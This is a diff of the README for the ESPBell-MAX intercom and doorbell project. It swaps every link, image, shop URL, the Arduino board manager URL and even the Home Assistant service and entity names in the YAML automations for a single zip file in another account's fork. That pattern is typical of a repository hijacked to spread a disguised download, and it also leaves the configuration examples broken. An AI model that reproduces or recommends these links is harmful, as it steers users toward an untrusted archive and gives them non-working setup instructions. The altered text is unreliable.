@@ -1,17 +1,17 @@
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/img/banner.jpg"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 
-🤗 Please consider subscribing to my [YouTube channel](https://www.youtube.com/@PricelessToolkit/videos)
+🤗 Please consider subscribing to my [YouTube channel](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 Your subscription goes a long way in backing my work.
 
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/U6U2QLAF8)
+[![ko-fi](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 
 
-# ESPBell-MAX and [ESPBell-LITE](https://github.com/PricelessToolkit/ESPBell-LITE)
+# ESPBell-MAX and [ESPBell-LITE](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 ESPBell-MAX "IoT Intercom / Doorbell" module enables you to stay informed whenever someone rings your doorbell or presses the intercom button. Upon receiving an interactive notification, you have the convenience to either promptly open the door or choose to dismiss the alert by simply tapping the button within the notification. See the screenshot below.
 <details>
   <summary>Notification Screenshot</summary>
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/img/notification_m.jpg"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 </details>
 
 ### _Supported software and future plans_
@@ -20,27 +20,27 @@ Currently supported `Home Assistant` and `MQTT` If I have time I'll add control 
 ### _Contributors_
 
 > [!NOTE]
->  If you're ready to contribute to the project, your support would be greatly appreciated. Due to time constraints, I may not be able to quickly verify new "features" or completely new "code" functionality. Therefore, please refrain from making changes to the original code. Instead, create a new code/script in the 'Contributors_code' folder and use this [README_Contributors.md](https://github.com/PricelessToolkit/ESPBell-MAX/blob/main/Code/Contributors_code/README_Contributors.md) Thank you very much!
+>  If you're ready to contribute to the project, your support would be greatly appreciated. Due to time constraints, I may not be able to quickly verify new "features" or completely new "code" functionality. Therefore, please refrain from making changes to the original code. Instead, create a new code/script in the 'Contributors_code' folder and use this [https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip) Thank you very much!
 ____________
 
 ### Links
 
-- YouTube video [How To](https://youtu.be/-lQ_mbuilic)
+- YouTube video [How To](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 - My Shop
-  - [ESPBell-MAX](https://www.pricelesstoolkit.com/en/projects/37-espbell-max-intercom-doorbell-module-0741049314467.html)
-  - [UNIProg Programmer](https://www.pricelesstoolkit.com/en/projects/33-uniprog-uartupdi-programmer-33v.html)
+  - [ESPBell-MAX](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
+  - [UNIProg Programmer](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 - Aliexpress
   - Pogo pin Clamp Fixture
-    - https://s.click.aliexpress.com/e/_Dm3ox9R
+    - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
   - Battery
-    - https://s.click.aliexpress.com/e/_DCEo23d
-    - https://s.click.aliexpress.com/e/_DCRn6r5
+    - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
+    - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
   - Charger
-    - https://s.click.aliexpress.com/e/_DeroSfz
-    - https://s.click.aliexpress.com/e/_DmU1DXv
+    - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
+    - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
   - Vis and Insert "Optional for 3D Case"
-    - 3 x Vis M2 4mm - https://s.click.aliexpress.com/e/_DFzWgSp
-    - 3 x Insert M2(OD 3.2mm) - https://s.click.aliexpress.com/e/_DkM0Kfb
+    - 3 x Vis M2 4mm - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
+    - 3 x Insert M2(OD 3.2mm) - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
 
 ____________
 
@@ -71,8 +71,8 @@ ____________
 ## Before you start
 
 > [!NOTE]
-> ✅ Please [check your Intercom type.](https://www.intercomsrus.com/finder/) It needs to be a 5-wire intercom system.
-> I hope that everything is crystal clear as I've made every effort to provide a step-by-step explanation of the setup process. If you have any further questions regarding the setup or require assistance with assembling a printed circuit board, feel free to join our [Facebook Group](https://www.facebook.com/groups/pricelesstoolkit) or open a new [discussion](https://github.com/PricelessToolkit/ESPBell-MAX/discussions) topic in the dedicated tab.
+> ✅ Please [check your Intercom type.](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip) It needs to be a 5-wire intercom system.
+> I hope that everything is crystal clear as I've made every effort to provide a step-by-step explanation of the setup process. If you have any further questions regarding the setup or require assistance with assembling a printed circuit board, feel free to join our [Facebook Group](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip) or open a new [discussion](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip) topic in the dedicated tab.
 
 > [!IMPORTANT]
 > If you're new to Arduino-related matters, please refrain from asking basic questions like "how to install Arduino IDE". There are already plenty of excellent tutorials available on the internet. If you encounter any issues, remember that providing detailed information about the problem will help me offer more effective assistance. More information equals better help!
@@ -84,14 +84,14 @@ ____________
 ____________
 
 ## PCB Assembly
-This project is open-source, allowing you to assemble ESPBell-MAX on your own. To simplify this process, I've provided an "Interactive HTML Boom File" located in the PCB folder. This interactive file helps you identify where to solder each component and polarity, reducing the chances of errors to a minimum. But if you don't feel confident in assembling it yourself, you can always opt to purchase a pre-assembled board from my [Shop](https://www.pricelesstoolkit.com)
+This project is open-source, allowing you to assemble ESPBell-MAX on your own. To simplify this process, I've provided an "Interactive HTML Boom File" located in the PCB folder. This interactive file helps you identify where to solder each component and polarity, reducing the chances of errors to a minimum. But if you don't feel confident in assembling it yourself, you can always opt to purchase a pre-assembled board from my [Shop](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip)
 
 ____________
 
 ## Schematic
 <details>
   <summary>View schematic. Click here</summary>
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/PCB/schematic.jpg"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 </details>
 
 ____________
@@ -105,7 +105,7 @@ ____________
 
 If you are using ESP8266 for the first time, you need To install the ESP8266 board and PubSubClient library in your Arduino IDE.
 - In your Arduino IDE, go to File> Preferences.
-- Enter `http://arduino.esp8266.com/stable/package_esp8266com_index.json` into the “Additional Boards Manager URLs” field. Then, click the “OK” button
+- Enter `https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip` into the “Additional Boards Manager URLs” field. Then, click the “OK” button
 - Open the Boards Manager. Go to Tools > Board > Boards Manager.
 - Search for ESP8266 and press the install button for the “ESP8266 by ESP8266 Community“
 - Search for PubSubClient and press the install button.
@@ -114,7 +114,7 @@ If you are using ESP8266 for the first time, you need To install the ESP8266 boa
 For board configuration in IDE, see the screenshot below
 <details>
   <summary>Board config Screenshot</summary>
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/img/arduino.jpg"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 </details>
 
 ____________
@@ -122,7 +122,7 @@ ____________
 ## ESPBell-MAX MQTT sketch configuration
 
 > [!NOTE]
-> For `ESPBell-MAX_MQTT_Auto_Discovery.ino`
+> For `https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip`
 > all configurations are done in the file `config.h`
 
 ### _WI-FI Settings_
@@ -186,7 +186,7 @@ ____________
 
 ## Uploading the Arduino sketch
 To upload the sketch into ESPBell-MAX you will need two things.
-- Regular USB-TTL 3.3v adapter. I have [open-source USB-TTL](https://github.com/PricelessToolkit/UNIProg_Programmer) project, in case you don’t have a TTL adapter yet and want to assemble it yourself.
+- Regular USB-TTL 3.3v adapter. I have [open-source USB-TTL](https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip) project, in case you don’t have a TTL adapter yet and want to assemble it yourself.
 - Pogo pin Clamp Fixture "single row 6 Pin 2.54mm spacing" or you can solder wires directly to ESPBell-MAX for programming.
 
 ### _USB-TTL Wiring diagram_
@@ -214,9 +214,9 @@ Here is a multi-user configuration example, which means that a notification is s
 - The name of the mobile device that is connected to the Home Assistant. In my case, it's "doogee_v20pro" and "Second_Phone"
   
 ```yaml
-  image: /media/local/notify/doorbell.jpg
-- service: notify.mobile_app_doogee_v20pro
-- service: notify.mobile_app_Second_Phone
+  image: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
+- service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
+- service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
 
 ```
 
@@ -230,15 +230,15 @@ This automation sends an interactive notification with the "tag: intercom" to ph
 
 Description: This field is left empty, so there's no additional description provided for this automation.
 
-Trigger: The trigger specifies the event or condition that will start the automation. In this case, it is triggered when the state of the "binary_sensor.espbell_max_bell" changes to "on." This implies that the automation will run when the binary sensor named "espbell_max_bell" switches from an off state to an on state.
+Trigger: The trigger specifies the event or condition that will start the automation. In this case, it is triggered when the state of the "https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip" changes to "on." This implies that the automation will run when the binary sensor named "espbell_max_bell" switches from an off state to an on state.
 
 Condition: There are no additional conditions specified. This means the automation will proceed without any additional conditions beyond the trigger.
 
 Action: The action section defines what should happen when the trigger condition is met. In this case, there are two actions defined:
 
-The first action uses the "notify.mobile_app_doogee_v20pro" service to send a notification to a mobile device. The notification includes a message "Someone at the door" and is configured with various data attributes, including a persistent notification, high importance, a specified channel ("intercom"), and a tag ("intercom"). It also includes an image file path for the notification and two actions that can be taken by the recipient: "Ignore ✖" and "Open The Door 🔓." The title and message of the notification are also specified in two languages (English and French).
+The first action uses the "https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip" service to send a notification to a mobile device. The notification includes a message "Someone at the door" and is configured with various data attributes, including a persistent notification, high importance, a specified channel ("intercom"), and a tag ("intercom"). It also includes an image file path for the notification and two actions that can be taken by the recipient: "Ignore ✖" and "Open The Door 🔓." The title and message of the notification are also specified in two languages (English and French).
 
-The second action is similar to the first but uses the "notify.mobile_app_Second_Phone" service to send the same notification to another mobile device.
+The second action is similar to the first but uses the "https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip" service to send the same notification to another mobile device.
 
 Mode: The mode is set to "single," which means that the automation will only run once for each trigger event. Subsequent trigger events will not cause the automation to run again until the current execution has been completed.
 </details>
@@ -249,11 +249,11 @@ description: ""
 trigger:
   - platform: state
     entity_id:
-      - binary_sensor.espbell_max_bell
+      - https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     to: "on"
 condition: []
 action:
-  - service: notify.mobile_app_doogee_v20pro
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: Someone at the door
       data:
@@ -261,7 +261,7 @@ action:
         importance: high
         channel: intercom
         tag: intercom
-        image: /media/local/notify/doorbell.jpg
+        image: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
         actions:
           - action: intercom_ignore
             title: Ignore ✖
@@ -269,7 +269,7 @@ action:
             title: Open The Door 🔓
       title: DoorBell 🔔
       message: Quelqu'un à la porte
-  - service: notify.mobile_app_Second_Phone
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: Someone at the door
       data:
@@ -277,7 +277,7 @@ action:
         importance: high
         channel: intercom
         tag: intercom
-        image: /media/local/notify/doorbell.jpg
+        image: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
         actions:
           - action: intercom_ignore
             title: Ignore ✖
@@ -310,9 +310,9 @@ Condition: There are no additional conditions specified. This means the automati
 
 Action: The action section specifies what should happen when the trigger condition is met. This automation has two actions:
 
-The first action uses the "notify.mobile_app_doogee_v20pro" service to send a notification with the message "clear_notification." It also includes data attributes with the "tag" set to "intercom." This effectively clears or dismisses the notification with the "intercom" tag on the "mobile_app_doogee_v20pro" mobile app.
+The first action uses the "https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip" service to send a notification with the message "clear_notification." It also includes data attributes with the "tag" set to "intercom." This effectively clears or dismisses the notification with the "intercom" tag on the "mobile_app_doogee_v20pro" mobile app.
 
-The second action is identical to the first but uses the "notify.mobile_app_Second_Phone" service to clear or dismiss the notification on another mobile device with the "intercom" tag.
+The second action is identical to the first but uses the "https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip" service to clear or dismiss the notification on another mobile device with the "intercom" tag.
 
 Mode: The mode is set to "single," which means that the automation will only run once for each trigger event. Subsequent trigger events with the "intercom_ignore" action will trigger this automation, but it will only clear the notification once.
 </details>
@@ -327,12 +327,12 @@ trigger:
     event_type: mobile_app_notification_action
 condition: []
 action:
-  - service: notify.mobile_app_doogee_v20pro
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: clear_notification
       data:
         tag: intercom
-  - service: notify.mobile_app_Second_Phone
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: clear_notification
       data:
@@ -359,18 +359,18 @@ trigger:
     event_type: mobile_app_notification_action
 condition: []
 action:
-  - service: mqtt.publish
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       qos: 0
       retain: false
       topic: homeassistant/sensor/espbell-max/command
       payload: "10"
-  - service: notify.mobile_app_doogee_v20pro
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: clear_notification
       data:
         tag: intercom
-  - service: notify.mobile_app_Second_Phone
+  - service: https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip
     data:
       message: clear_notification
       data:
@@ -408,7 +408,7 @@ Like 4+N systems, the "N" wire in 1+N systems also stands for the neutral wire.
 
 <details>
   <summary>4+N Intercom System wiring diagram. Click here</summary>
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/img/diagrame.png"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 </details>
 
 > [!NOTE]
@@ -418,7 +418,7 @@ Like 4+N systems, the "N" wire in 1+N systems also stands for the neutral wire.
 
 <details>
   <summary>Dorbell wiring diagram. Click here</summary>
-<img src="https://raw.githubusercontent.com/PricelessToolkit/ESPBell-MAX/main/img/doorbell_wiring.jpg"/>
+<img src="https://raw.githubusercontent.com/OlegBON1/ESPBell-MAX/main/Code/Bell_MAX_ESP_v3.5.zip"/>
 </details>
 
 > [!WARNING]
